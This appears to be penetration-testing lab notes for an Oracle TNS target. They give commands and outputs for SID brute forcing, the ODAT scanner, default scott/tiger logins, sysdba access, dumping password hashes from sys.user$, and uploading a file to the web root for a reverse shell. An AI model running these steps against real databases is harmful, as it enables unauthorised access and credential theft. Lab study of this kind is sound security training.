### Footprinting:

$ `sudo nmap -p1521 -sV 10.129.204.235 --open`

### SSID Brute Force:

`$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute`

### ODAT:

$ `./odat.py all -s 10.129.204.235`

### SQLplu - Log In:

`$ sqlplus scott/tiger@10.129.204.235/XE`

If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

`$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig`

### Oracle RDBMS - Interaction

:

`SQL> select table_name from all_tables;`

`TABLE_NAME`

`------------------------------`

`DUAL`

`SYSTEM_PRIVILEGE_MAP`

`TABLE_PRIVILEGE_MAP`

`STMT_AUDIT_OPTION_MAP`

`AUDIT_ACTIONS`

`WRR$_REPLAY_CALL_FILTER`

`HS_BULKLOAD_VIEW_OBJ`

`HS$_PARALLEL_METADATA`

`HS_PARTITION_COL_NAME`

`HS_PARTITION_COL_TYPE`

`HELP`

`...SNIP...`

`SQL> select * from user_role_privs;`

`USERNAME                       GRANTED_ROLE                   ADM DEF OS_`

`------------------------------ ------------------------------ --- --- ---`

`SCOTT                          CONNECT                        NO  YES NO`

`SCOTT                          RESOURCE                       NO  YES NO`

### Oracle RDBMS - Database Enumeration

:

`$ sqlplus scott/tiger@10.129.204.235/XE as sysdba`

`SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023`

`Version 21.4.0.0.0`

`Copyright (c) 1982, 2021, Oracle. All rights reserved.`

`Connected to:`

`Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production`

`SQL> select * from user_role_privs;`

`USERNAME                       GRANTED_ROLE                   ADM DEF OS_`

`------------------------------ ------------------------------ --- --- ---`

`SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO`

`SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO`

`SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO`

`SYS                            AQ_USER_ROLE                   YES YES NO`

`SYS                            AUTHENTICATEDUSER              YES YES NO`

`SYS                            CONNECT                        YES YES NO`

`SYS                            CTXAPP                         YES YES NO`

`SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO`

`SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO`

`SYS                            DBA                            YES YES NO`

`SYS                            DBFS_ROLE                      YES YES NO`

`USERNAME                       GRANTED_ROLE                   ADM DEF OS_`

`------------------------------ ------------------------------ --- --- ---`

`SYS                            DELETE_CATALOG_ROLE            YES YES NO`

`SYS                            EXECUTE_CATALOG_ROLE           YES YES NO`

`...SNIP...`

### Oracle RDBMS - Extract Password Hashes:

`SQL> select name, password from sys.user$;`

`NAME                           PASSWORD`

`------------------------------ ------------------------------`

`SYS                            FBA343E7D6C8BC9D`

`PUBLIC`

`CONNECT`

`RESOURCE`

`DBA`

`SYSTEM                         B5073FE1DE351687`

`SELECT_CATALOG_ROLE`

`EXECUTE_CATALOG_ROLE`

`DELETE_CATALOG_ROLE`

`OUTLN                          4A3BA55E08595C81`

`EXP_FULL_DATABASE`

`NAME                           PASSWORD`

`------------------------------ ------------------------------`

`IMP_FULL_DATABASE`

`LOGSTDBY_ADMINISTRATOR`

`...SNIP...`

### Oracle RDBMS - File Upload (For reverse shell):

`$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt`

`$ curl -X GET http://10.129.204.235/testing.txt`

### ODAT setup for TNS server:

`$ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip`

`wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip`

`sudo mkdir -p /opt/oracle`

`sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip`

`sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip`

`export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH`

`export PATH=$LD_LIBRARY_PATH:$PATH`

`source ~/.bashrc`

`cd ~`

`git clone https://github.com/quentinhardy/odat.git`

`cd odat/`

`pip install python-libnmap`

`git submodule init`

`git submodule update`

`pip3 install cx_Oracle`

`sudo apt-get install python3-scapy -y`

`sudo pip3 install colorlog termcolor passlib python-libnmap`

`sudo apt-get install build-essential libgmp-dev -y`

`pip3 install pycryptodome`

`--2025-06-24 00:24:53--  https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip`

`Resolving download.oracle.com (download.oracle.com)... 23.58.104.121`

`Connecting to download.oracle.com (download.oracle.com)|23.58.104.121|:443... connected.`

`HTTP request sent, awaiting response... 200 OK`

`Length: 79386308 (76M) [application/zip]`

`Saving to: 'instantclient-basic-linux.x64-21.4.0.0.0dbru.zip'`

`<SNIP>`